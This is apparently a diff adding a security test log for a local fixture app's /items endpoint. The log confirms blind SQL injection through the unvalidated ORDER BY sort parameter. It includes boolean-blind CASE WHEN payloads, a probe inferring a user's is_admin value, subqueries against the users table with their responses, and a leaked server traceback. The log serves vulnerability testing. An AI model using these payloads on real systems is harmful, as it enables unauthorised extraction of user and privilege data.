@@ -1,0 +1,18 @@
+=== F: /items sort = SQL injection (ORDER BY unvalidated, interpolated) ===
+--- valid sort=price (baseline ordering, first labels) ---
+{"count": 5, "items": [{"id": 2, "label": "item2", "price": 20}, {"id": 4, "label": "item4", "price": 40}, {"id": 6, "label": "item6", "price": 60}, {"id": 8, "label": "item8", "price": 80}, {"id": 10, "label": "item10", "price": 100}]}
+--- sort=note (column not in items -> expect graceful 400; README: sort in {id,label,price}) ---
+{"error": "server_error", "trace": "Traceback (most recent call last):\n  File \"/path/to/workspace/fixture/app.py\", line 88, in do_GET\n    rows = DB.execute(sql).fetchall()\n           ~~~~~~~~~~^^^^^\nsqlite3.OperationalError: no such column: note\n"}
+HTTP 500
+--- boolean-blind: CASE WHEN 1=1 THEN price END  (orders by price) ---
+{"count": 5, "items": [{"id": 2, "label": "item2", "price": 20}, {"id": 4, "label": "item4", "price": 40}, {"id": 6, "label": "item6", "price": 60}, {"id": 8, "label": "item8", "price": 80}, {"id": 10, "label": "item10", "price": 100}]}
+--- boolean-blind: CASE WHEN 1=2 THEN price END  (constant NULL -> original id order) ---
+{"count": 5, "items": [{"id": 2, "label": "item2", "price": 20}, {"id": 4, "label": "item4", "price": 40}, {"id": 6, "label": "item6", "price": 60}, {"id": 8, "label": "item8", "price": 80}, {"id": 10, "label": "item10", "price": 100}]}
+--- cross-table extraction: order depends on bob's is_admin value ---
+{"count": 5, "items": [{"id": 2, "label": "item2", "price": 20}, {"id": 4, "label": "item4", "price": 40}, {"id": 6, "label": "item6", "price": 60}, {"id": 8, "label": "item8", "price": 80}, {"id": 10, "label": "item10", "price": 100}]}--- plain sort=label (lexicographic: item10 before item2) ---
+['item10', 'item12', 'item14', 'item16']
+--- subquery TRUE  -> orders by label  : CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN label ELSE id END ---
+['item10', 'item12', 'item14', 'item16']
+--- subquery FALSE -> orders by id     : CASE WHEN (SELECT COUNT(*) FROM users)>99 THEN label ELSE id END ---
+['item2', 'item4', 'item6', 'item8']
+(Different first rows between the two => the subquery over the users table was executed: blind SQLi confirmed)
